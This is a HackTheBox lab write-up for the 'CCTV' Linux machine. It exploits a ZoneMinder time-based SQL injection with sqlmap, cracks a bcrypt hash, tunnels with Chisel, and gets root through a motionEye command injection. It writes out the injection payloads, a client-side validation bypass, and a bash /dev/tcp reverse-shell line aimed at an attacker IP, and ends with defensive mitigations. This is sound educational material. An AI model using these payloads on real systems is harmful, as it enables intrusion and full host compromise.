---
title: CCTV
os: Linux
difficulty: Easy
tags:
  - SQL Injection
  - ZoneMinder
  - Hashcat
  - Chisel
  - motionEye
  - Command Injection
  - Privilege Escalation
  - CVE-2024-51428
  - CVE-2025-60787
---

# 🛡️ HTB - CCTV (Easy)

<p align="center">
  <img src="https://img.shields.io/badge/Platform-HackTheBox-green?style=for-the-badge&logo=hackthebox" alt="HackTheBox" />
  <img src="https://img.shields.io/badge/OS-Linux-orange?style=for-the-badge&logo=linux" alt="OS Linux" />
  <img src="https://img.shields.io/badge/Difficulty-Easy-green?style=for-the-badge" alt="Easy Difficulty" />
</p>

---

### 💻 Target Information
- **Machine Name:** CCTV
- **Operating System:** Linux (Ubuntu)
- **Difficulty:** Easy
- **Vulnerabilities:** SQL Injection in ZoneMinder (CVE-2024-51428), OS Command Injection in motionEye (CVE-2025-60787)

---

```text
\-------------------------------------------------------------------------------------CCTV Notes---------------------------------------------------------------------------------------------
```

## Step 1 - Reconnaissance

```bash
nmap -A -sS -P -T4  --min-rate 5000 10.129.5.203

Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-13 14:10 UTC

Nmap scan report for 10.129.5.203

Host is up (0.24s latency).

Not shown: 998 closed tcp ports (reset)

PORT   STATE SERVICE VERSION

22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)

| ssh-hostkey:

|_  256 76:1d:73:98:fa:05:f7:0b:04:c2:3b:c4:7d:e6:db:4a (ECDSA)

80/tcp open  http    Apache httpd 2.4.58

|_http-title: Did not follow redirect to http://cctv.htb/

No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).

TCP/IP fingerprint:

OS:SCAN(V=7.94SVN%E=4%D=3/13%OT=22%CT=1%CU=37963%PV=Y%DS=2%DC=T%G=Y%TM=69B4

OS:1B1E%P=x86_64-pc-linux-gnu)SEQ(SP=FD%GCD=1%ISR=104%TI=Z%CI=Z%TS=A)SEQ(SP

OS:=FD%GCD=1%ISR=104%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M552ST11NW7%O2=M552ST11NW7%

OS:O3=M552NNT11NW7%O4=M552ST11NW7%O5=M552ST11NW7%O6=M552ST11)WIN(W1=FE88%W2

OS:=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M552NNS

OS:NW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%

OS:DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%

OS:O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%

OS:W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%

OS:RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops

Service Info: Host: default; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 23/tcp)

HOP RTT       ADDRESS

1   243.89 ms 10.10.14.1

2   237.41 ms 10.129.5.203

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

Nmap done: 1 IP address (1 host up) scanned in 98.18 seconds
```

- 🔍 *Easy Peasy Linux machine.....*

- 🔍 *Looking at the web page, it appears to be a Monitoring service of security Cameras or something.*

- 🔍 *It has a login page Named Zone Minder.*

- 🔍 *I Randomly Typed username and password admin to capture the request , and surprisingly it granted the access to the web panel.*

- 🔍 *While Looking at the Web Admin Panel. first Interseting i got was the version, The version was  Zone Minder v1.37.63.*

- 🔍 *While Searching for Know Vulnerabilities, i Found one*

> [!NOTE]
> Initial Access: SQL Injection in ZoneMinder (CVE-2024-51428) :-The web application, identified as ZoneMinder version 1.37.63, was found to be vulnerable to an authenticated SQL Injection (CVE-2024-51428). This vulnerability allows an attacker to inject malicious SQL queries through the tid parameter within the removetag action of the event request.

- 🔍 *So It's a Time-Based Blind Sql Injection*

> [!NOTE]
> What is Time-Based Blind Sql Injection :- A Time-based SQL Injection vulnerability is a type of Blind SQL Injection where an attacker infers information by observing the time it takes for a database to respond to a specially crafted query.

```text
Unlike traditional SQL injection, which displays database data directly on the page, time-based attacks are used when the application suppresses error messages and does not return any data in the response, making it "blind".

&#x20;
```

> [!NOTE]
> How Time-Based SQL Injection Works:-

```text
Injecting Logic: The attacker sends a request containing a SQL payload designed to ask a true/false question.

Triggering a Delay: If the condition is true, the database is instructed to execute a time-consuming operation (a "sleep" command). If false, the database responds immediately.

Observing the Delay: The attacker measures the time it takes to receive the HTTP response. A noticeable delay (e.g., 5-10 seconds) confirms the condition was true.

Data Extraction: By repeatedly asking questions (e.g., "Is the first character of the database version '5'?"), the attacker can rebuild data character-by-character.
```

- 🔍 *In short If We See any delay in response, exploit was successfull, otherwise not.*

```text
**[^] Web Login Page Username and Password is---> admin**

\--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
```

## Step 2 - Initial Foothold

- 🔍 *As We already Found the Vulnerability, lets confirm it via SQLMAP*

```bash
sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" \\

&#x20;   --cookie="ZMSESSID=i5ie78cg2qt7tsucl54kbbiu5r" \\

&#x20;   -p tid --dbms=mysql --batch

&#x20;       ___

&#x20;      __H__

&#x20;___ ___["]_____ ___ ___  {1.9.6.1#dev}

|_ -| . [)]     | .'| . |

|___|_  [.]_|_|_|__,|  _|

&#x20;     |_|V...       |_|   https://sqlmap.org
```

> [!IMPORTANT]
> legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

```text
[*] starting @ 14:25:53 /2026-03-13/

[14:25:55] [INFO] testing connection to the target URL

[14:25:56] [INFO] checking if the target is protected by some kind of WAF/IPS

[14:25:56] [INFO] testing if the target URL content is stable

[14:25:57] [INFO] target URL content is stable

[14:25:57] [WARNING] heuristic (basic) test shows that GET parameter 'tid' might not be injectable

[14:25:58] [INFO] testing for SQL injection on GET parameter 'tid'

[14:25:58] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'

[14:26:05] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'

[14:26:06] [INFO] testing 'Generic inline queries'

[14:26:06] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'

[14:26:08] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'

[14:26:08] [WARNING] time-based comparison requires larger statistical model, please wait.......... (done)

[14:26:24] [INFO] GET parameter 'tid' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable

for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y

[14:26:24] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'

[14:26:24] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found

[14:26:32] [INFO] target URL appears to be UNION injectable with 4 columns

injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] Y

[14:26:44] [INFO] checking if the injection point on GET parameter 'tid' is a false positive

GET parameter 'tid' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N

sqlmap identified the following injection point(s) with a total of 93 HTTP(s) requests:

\---

**Parameter: tid (GET)**

&#x20;   **Type: time-based blind**

&#x20;   **Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)**

&#x20;   **Payload: view=request&request=event&action=removetag&tid=1 AND (SELECT 8298 FROM (SELECT(SLEEP(5)))NBiO)**

\---

[14:27:08] [INFO] the back-end DBMS is MySQL

[14:27:08] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions

web server operating system: Linux Ubuntu

web application technology: Apache 2.4.58

back-end DBMS: MySQL >= 5.0.12

[14:27:09] [WARNING] HTTP error codes detected during run:

500 (Internal Server Error) - 57 times

[14:27:09] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/cctv.htb'

[14:27:09] [WARNING] your sqlmap version is outdated

[*] ending @ 14:27:09 /2026-03-13/
```

- 🔍 *Vulnerability Confirmed!*

- 🔍 *In the Output we can see, that the tid parameter is vulnerable, and we can concatenate the Sql crafted payload along, and can infer the response delay as success.*

> [!IMPORTANT]
> The Injection Would look something like this ---> DELETE FROM Tags WHERE event_id = 1 AND tag_id = 1 **AND (SELECT 8298 FROM (SELECT(SLEEP(5)))NBiO)**

- 🔍 *If this query takes exactly 5 seconds to respond, then we know it was successful.*

- 🔍 *I also tried to check the delay with a curl request for real time evaluation. but it just didn't worked.*

- 🔍 *Lets try to dump the usernames, via SQLMAP*

```bash
sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" \\

&#x20;   --cookie="ZMSESSID=i5ie78cg2qt7tsucl54kbbiu5r" \\

&#x20;      -p tid --dbms=mysql --batch -D zm -T Users -C "Username" --dump

&#x20;       ___

&#x20;      __H__

&#x20;___ ___[']_____ ___ ___  {1.9.6.1#dev}

|_ -| . [']     | .'| . |

|___|_  [(]_|_|_|__,|  _|

&#x20;     |_|V...       |_|   https://sqlmap.org
```

> [!IMPORTANT]
> legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

```text
[*] starting @ 14:52:36 /2026-03-13/

[14:52:36] [INFO] testing connection to the target URL

sqlmap resumed the following injection point(s) from stored session:

\---

Parameter: tid (GET)

&#x20;   Type: time-based blind

&#x20;   Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)

&#x20;   Payload: view=request&request=event&action=removetag&tid=1 AND (SELECT 8298 FROM (SELECT(SLEEP(5)))NBiO)

\---

[14:52:37] [INFO] testing MySQL

[14:52:37] [INFO] confirming MySQL

[14:52:37] [INFO] the back-end DBMS is MySQL

web server operating system: Linux Ubuntu

web application technology: Apache 2.4.58

back-end DBMS: MySQL >= 8.0.0

[14:52:37] [INFO] fetching entries of column(s) 'Username' for table 'Users' in database 'zm'

[14:52:37] [INFO] fetching number of column(s) 'Username' entries for table 'Users' in database 'zm'

you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] Y

.............................. (done)

[14:52:45] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions

do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y

[14:53:01] [INFO] adjusting time delay to 1 second due to good response times

3

[14:53:03] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)

a

[14:53:27] [ERROR] invalid character detected. retrying..

[14:53:27] [WARNING] increasing time delay to 2 seconds

dmin

[14:54:18] [INFO] retrieved: mark

[14:55:15] [ERROR] invalid character detected. retrying..

[14:55:15] [WARNING] increasing time delay to 3 seconds

[14:55:16] [INFO] retrieved: superadmin

Database: zm

Table: Users

[3 entries]

**+------------+**

**| Username   |**

**+------------+**

**| admin      |**

**| mark       |**

**| superadmin |**

**+------------+**

[14:58:01] [INFO] table 'zm.Users' dumped to CSV file '/root/.local/share/sqlmap/output/cctv.htb/dump/zm/Users.csv'

[14:58:01] [WARNING] HTTP error codes detected during run:

500 (Internal Server Error) - 198 times

[14:58:01] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/cctv.htb'

[14:58:01] [WARNING] your sqlmap version is outdated

[*] ending @ 14:58:01 /2026-03-13/
```

- 🔍 *Okay, So the dump is successful, now lets try to obtain the password hash for user--> mark*

```bash
sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" \\

&#x20;   --cookie="ZMSESSID=gl5bdpecie4ug6sb2bet115ovk" \\    

&#x20;   -p tid --dbms=mysql --batch -D zm -T Users -C "Password" --where="Username='mark'" --dump

&#x20;       ___

&#x20;      __H__

&#x20;___ ___[,]_____ ___ ___  {1.9.6.1#dev}

|_ -| . [)]     | .'| . |

|___|_  ["]_|_|_|__,|  _|

&#x20;     |_|V...       |_|   https://sqlmap.org
```

> [!IMPORTANT]
> legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

```text
[*] starting @ 13:55:56 /2026-03-14/

[13:55:57] [INFO] testing connection to the target URL

sqlmap resumed the following injection point(s) from stored session:

\---

Parameter: tid (GET)

&#x20;   Type: time-based blind

&#x20;   Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)

&#x20;   Payload: view=request&request=event&action=removetag&tid=1 AND (SELECT 8298 FROM (SELECT(SLEEP(5)))NBiO)

\---

[13:55:57] [INFO] testing MySQL

[13:55:57] [INFO] confirming MySQL

[13:55:57] [INFO] the back-end DBMS is MySQL

web server operating system: Linux Ubuntu

web application technology: Apache 2.4.58

back-end DBMS: MySQL >= 8.0.0

[13:55:57] [INFO] fetching entries of column(s) 'Password' for table 'Users' in database 'zm'           

[13:55:57] [INFO] fetching number of column(s) 'Password' entries for table 'Users' in database 'zm'    

[13:55:57] [INFO] resumed: 1

[13:55:57] [INFO] resuming partial value: $2y$10$prZGnazejKcuTv5bKNexXOg

[13:55:57] [WARNING] (case) time-based comparison requires larger statistical model, please wait.............................. (done)

do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y

[13:56:12] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 

[13:56:23] [INFO] adjusting time delay to 1 second due to good response times

LyQaok0hq0

[13:57:33] [ERROR] invalid character detected. retrying..

[13:57:33] [WARNING] increasing time delay to 2 seconds

7L

[13:58:10] [ERROR] invalid character detected. retrying..

[13:58:10] [WARNING] increasing time delay to 3 seconds

[13:59:12] [ERROR] invalid character detected. retrying..

[13:59:12] [WARNING] increasing time delay to 4 seconds

[13:59:22] [ERROR] invalid character detected. retrying..

[13:59:22] [WARNING] increasing time delay to 5 seconds

[13:59:34] [ERROR] invalid character detected. retrying..

[13:59:34] [WARNING] increasing time delay to 6 seconds

[13:59:48] [ERROR] invalid character detected. retrying..

[13:59:48] [WARNING] increasing time delay to 7 seconds

[14:00:09] [ERROR] unable to properly validate last character value ('')..

&#x20;  7AJ

[14:00:35] [ERROR] invalid character detected. retrying..

[14:00:35] [WARNING] increasing time delay to 2 seconds

/QNqZolbXKfF

[14:02:45] [ERROR] invalid character detected. retrying..

[14:02:45] [WARNING] increasing time delay to 3 seconds

G.

[14:03:13] [WARNING] potential binary fields detected ('Password'). In case of any problems you are advised to rerun table dump with '--fresh-queries --binary-fields="Password"'                               

Database: zm

Table: Users

[1 entry]

**+-------------------------------------------------------------------------+**

**| Password                                                                |**

**+-------------------------------------------------------------------------+**

**| $2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07L\\x01\\x00\\x017AJ/QNqZolbXKfFG. |**

**+-------------------------------------------------------------------------+**

[14:03:13] [INFO] table 'zm.Users' dumped to CSV file '/root/.local/share/sqlmap/output/cctv.htb/dump/zm/Users.csv'                                         

[14:03:13] [WARNING] HTTP error codes detected during run:

500 (Internal Server Error) - 435 times

[14:03:13] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/cctv.htb'

[14:03:13] [WARNING] your sqlmap version is outdated

[*] ending @ 14:03:13 /2026-03-14/
```

- 🔍 *Got the hash, and Seems like the hash is calculated via bcrypt with a cost factor of 10, so i guess it can be cracked. lets try!*

```text
**$2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.:opensesame**

&#x20;                                                         

Session..........: hashcat

Status...........: Cracked

Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))

Hash.Target......: $2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZ...XKfFG.

Time.Started.....: Sat Mar 14 14:24:13 2026 (6 mins, 32 secs)

Time.Estimated...: Sat Mar 14 14:30:45 2026 (0 secs)

Kernel.Feature...: Pure Kernel

Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)

Guess.Queue......: 1/1 (100.00%)

Speed.#1.........:       15 H/s (6.73ms) @ Accel:3 Loops:16 Thr:1 Vec:1

Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)

Progress.........: 5958/14344385 (0.04%)

Rejected.........: 0/5958 (0.00%)

Restore.Point....: 5949/14344385 (0.04%)

Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:1008-1024

Candidate.Engine.: Device Generator

Candidates.#1....: sunshine2 -> opensesame

Hardware.Mon.#1..: Util: 52%

Started: Sat Mar 14 14:22:19 2026

Stopped: Sat Mar 14 14:30:48 2026
```

- 🔍 *hash is cracked. now lets try to get a shell, with these creds*

```bash
ssh mark@cctv.htb

mark@cctv.htb's password: 

Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-101-generic x86_64)

&#x20;* Documentation:  https://help.ubuntu.com

&#x20;* Management:     https://landscape.canonical.com

&#x20;* Support:        https://ubuntu.com/pro

&#x20;System information as of Sat 14 Mar 13:56:50 UTC 2026

&#x20; System load:           0.24

&#x20; Usage of /:            72.5% of 8.70GB

&#x20; Memory usage:          27%

&#x20; Swap usage:            0%

&#x20; Processes:             256

&#x20; Users logged in:       0

&#x20; IPv4 address for eth0: 10.129.6.105

&#x20; IPv6 address for eth0: dead:beef::250:56ff:feb0:da46

&#x20;* Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s

&#x20;  just raised the bar for easy, resilient and secure K8s cluster deployment.

&#x20;  https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

14 additional security updates can be applied with ESM Apps.

Learn more about enabling ESM Apps service at https://ubuntu.com/esm

The list of available updates is more than a week old.

To check for new updates run: sudo apt update

mark@cctv:~$
```

- 🔍 *While Enumerating the shell, with linPEAS, I've got to know that there is an internal service of motioneye is running on port 8765*

```text
tcp        0      0 127.0.0.1:8765          0.0.0.0:*               LISTEN 

motioneye.service                        loaded active running motionEye Server

&#x20; Potential issue in service: motioneye.service

&#x20; └─ RUNS_AS_ROOT: Service runs as root
```

- 🔍 *As its an internal Port, and listening on an internal localhost. so we gotta tunnel it up*

> [!IMPORTANT]
> On Attacker Machine--->

```text
&#x20;./chisel-lin server --port 8099 --reverse --socks5

2026/03/14 15:07:46 server: Reverse tunnelling enabled

2026/03/14 15:07:46 server: Fingerprint Me7vsC01vrUEKY7O5syFPAiJSWvWf2OBilaxx5QpQGM=

2026/03/14 15:07:46 server: Listening on http://0.0.0.0:8099

2026/03/14 15:08:23 server: session#1: tun: proxy#R:7999=>8765: Listening

2026/03/14 15:09:45 server: session#2: tun: proxy#R:8765=>8765: Li
```

> [!IMPORTANT]
> On target--->

```text
mark@cctv:~$ ./chisel-lin client 10.10.14.****:8098 R:7999:127.0.0.1:7999

2026/03/14 15:22:21 client: Connecting to ws://10.10.14.****:8098

2026/03/14 15:22:23 client: Connected (Latency 264.663554ms)

(note:- first start the server, then the listener)
```

- 🔍 *Once Tunneling is done, get the shell with*

```text
&#x20;ssh -L 8765:127.0.0.1:8765 mark@cctv.htb
```

- 🔍 *Once its done, go to /etc/motioneye, and there you'll find it's configuration file*

```text
mark@cctv:/etc/motioneye$ ls

camera-1.conf  motion.conf  motioneye.conf

mark@cctv:/etc/motioneye$ cat motion.conf

# @admin_username admin

# **@normal_username user**

**# @admin_password 989c5a8ee87a0e9521ec81a79187d162109282f0**

# @lang en

# @enabled on

# @normal_password 

setup_mode off

webcontrol_port 7999

webcontrol_interface 1

webcontrol_localhost on

webcontrol_parms 2

camera camera-1.conf
```

- 🔍 *From this file we'll get the web UI, username and password.*

```text
[~] Fun Fact, this is SHA-1 hash, and i tried to crack it, but it didn't cracked, and i then i put the hash as it as password, and it worked. so put the hash as it is in the password field.
```

- 🔍 *Once you're in the Web UI, you can see it shows some cameras real time footages, but the interesting thing was it's version----> motionEye Version 	0.43.1b4 Motion Version 	4.7.1*

- 🔍 *I Searched any for Vulnerabilities of this version of motion eye, and got one-->CVE-2025-60787*

```text
MotionEye v0.43.1b4 and before is vulnerable to OS Command Injection in configuration parameters such as image_file_name. Unsanitized user input is written to Motion configuration files, allowing remote authenticated attackers with admin access to achieve code execution when Motion is restarted.
```

- 🔍 *means we can concatenate a shell command in the image_file_name parameter/user-field, and due to unsanitized validation of this field, the server can execute our shell command.*

```text
\--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
```

## Step 3 - Privilege Escalation

- 🔍 *As we got the vulnerability, now lets make the attack chain*

```text
1.we'll put a rev shell payload in the image_file_name parameter

2.will trigger it via curl

3.will get the shell
```

- 🔍 *Execution:-*

- 🔍 *Before doing anything, we need to tunnel the port 7999 with our kali machine. do it as the same way as we did for 8765*

- 🔍 *Once done, Then we have do the client side validation bypass*

- 🔍 *What's that? The web UI attempts to block shell syntax in fields like Image File Name using a JavaScript function configUiValid(). This can be bypassed by overriding the function in the browser console (F12):*

```text
configUiValid = function() { return true; };
```

- 🔍 *Write the above statement in the console.*

- 🔍 *once done write this in the image_file_name input field*

```bash
$(python3 -c "import os;os.system('bash -c \\"bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1\\"')").%Y-%m-%d-%H-%M-%S
```

- 🔍 *Start a listener*

- 🔍 *Trigger it via ---> curl "http://127.0.0.1:7999/1/action/snapshot"*

```text
&#x20;curl "http://127.0.0.1:7999/1/action/snapshot"

Snapshot for camera 1 

Done
```

- 🔍 *On Listener you'll get the shell*

```text
nc -lvnp 4444                                     

listening on [any] 4444 ...

connect to [10.10.14.****] from (UNKNOWN) [10.129.244.156] 36722

bash: cannot set terminal process group (3081): Inappropriate ioctl for device

bash: no job control in this shell

root@cctv:/etc/motioneye#
```

- 🔍 *Rooted!, User Flag is in /home/sa_mark, and root in default location. Enjoy!*

## Mitigations & Security Perspective

> [!IMPORTANT]
> **🛡️ Blue Team Infrastructure & Application Security Assessment**
> Below is the post-exploitation blueprint analyzing every vulnerability and administrative configuration issue exploited in the CCTV environment. Each identified weakness is mapped to its core risk, threat context, and practical defensive remediation strategies.

### 🔴 Authenticated SQL Injection in ZoneMinder (CVE-2024-51428)

> [!WARNING]
> **Vulnerability Profile:**
> The ZoneMinder web application exposes an authenticated SQL Injection vulnerability on the `tid` parameter within the `removetag` action. 

> [!CAUTION]
> **Risk & Downstream Threat Impact:**
> SQL Injection allows attackers to query database schemas, bypass access controls, and dump password hashes of administrative users. By exploiting the time-based injection point, attackers can perform complete database dumping, leading directly to password cracking and lateral movement across SSH endpoints.

> [!TIP]
> **Defensive Remediation & Detection Strategies:**
> - **Remediation:** Update ZoneMinder to the latest secure release (v1.37.64 or newer) where query parameters are fully parameterized.
> - **Remediation:** Implement server-side input validation/casting to guarantee the `tid` parameter only accepts strict integer types.
> - **Detection:** Deploy a Web Application Firewall (WAF) to detect common SQL injection signatures (e.g., `AND SLEEP()`, `UNION SELECT`) directed to index pages.

---

### 🔴 motionEye Configuration Command Injection (CVE-2025-60787)

> [!WARNING]
> **Vulnerability Profile:**
> The motionEye surveillance panel is vulnerable to OS Command Injection via the `image_file_name` configuration parameter, which is written directly into backend configuration files.

> [!CAUTION]
> **Risk & Downstream Threat Impact:**
> Because the `motioneye` service daemon runs under the high-privilege `root` user context, successful command injection leads to an immediate and complete system compromise. Attackers can execute arbitrary system commands, establish persistent reverse shells, and compromise host confidentiality and integrity.

> [!TIP]
> **Defensive Remediation & Detection Strategies:**
> - **Remediation:** Update motionEye to a patched version that strips control characters (`$`, `(`, `)`, `;`, `&`) from configuration parameters.
> - **Remediation:** Enforce the principle of least privilege: configure the motionEye daemon to run under an unprivileged user context rather than `root`.
> - **Detection:** Use host intrusion detection systems (such as Sysmon or auditd) to monitor child processes spawned by web server daemons (e.g., python/motioneye launching `/bin/bash` or `/usr/bin/python3`).

---

### 🟡 Weak Password Controls and exposed SHA-1 Configuration Hashes

> [!WARNING]
> **Vulnerability Profile:**
> Local user credentials cracked easily via rockyou wordlist (opensesame). The motionEye admin password verification implementation allows using the raw SHA-1 hash instead of the plaintext password, bypassing hash protection mechanisms.

> [!CAUTION]
> **Risk & Downstream Threat Impact:**
> If an attacker obtains read access to `/etc/motioneye/motion.conf`, they can instantly log in to the motionEye web portal without needing to crack the SHA-1 hash. Combined with weak SSH credentials, attackers can pivot easily from web vulnerabilities to local system shells.

> [!TIP]
> **Defensive Remediation & Detection Strategies:**
> - **Remediation:** Adjust configuration file permissions so `/etc/motioneye/motion.conf` is strictly read-only by the service owner (e.g., `chmod 600`).
> - **Remediation:** Fix the password hashing verify logic in the application codebase to verify against plaintext passwords and prevent raw hash inputs from validating successfully.

